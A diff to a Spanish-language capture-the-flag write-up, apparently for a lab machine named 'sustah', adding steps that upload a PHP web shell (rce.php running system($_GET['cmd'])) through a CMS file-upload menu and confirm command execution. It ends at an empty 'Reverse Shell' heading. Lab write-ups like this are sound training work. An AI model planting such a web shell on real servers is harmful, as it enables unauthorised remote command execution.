@@ -191,7 +191,27 @@ Nos creamos un usuario y nos logueamos con el
 
 ![image](https://github.com/Esevka/CTF/assets/139042999/87019269-68ed-49b7-acb4-53cbd77651a4)
 
-Desde el menu File-->new (nos da opcion a subir ficheros al sistema).
+Desde el menu File-->new,nos da opcion a subir ficheros al sistema, por lo que vamos a subir un fichero llamado rce.php que nos permitar ejecutar comandos desde la url
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/sustah/script]
+    └─# cat rce.php          
+    <?php
+    system($_GET['cmd']);
+    ?>
+
+Una vez subido el fichero el CMS nos muestra un pequeno log indicando que el proceso se ha realizado correctamente y el path donde se ha guardado nuestro fichero.
+
+![image](https://github.com/Esevka/CTF/assets/139042999/c69e56d4-ccc1-4f2f-bc82-e8a85f521f73)
+
+Ejecutamos nuestro rce y vemos que funciona 
+
+![image](https://github.com/Esevka/CTF/assets/139042999/4c49ef16-32a9-49eb-8eac-8e0f4e7795d0)
+
+
+## Obtenemos Reverse Shell
+
+
+
 
 
 
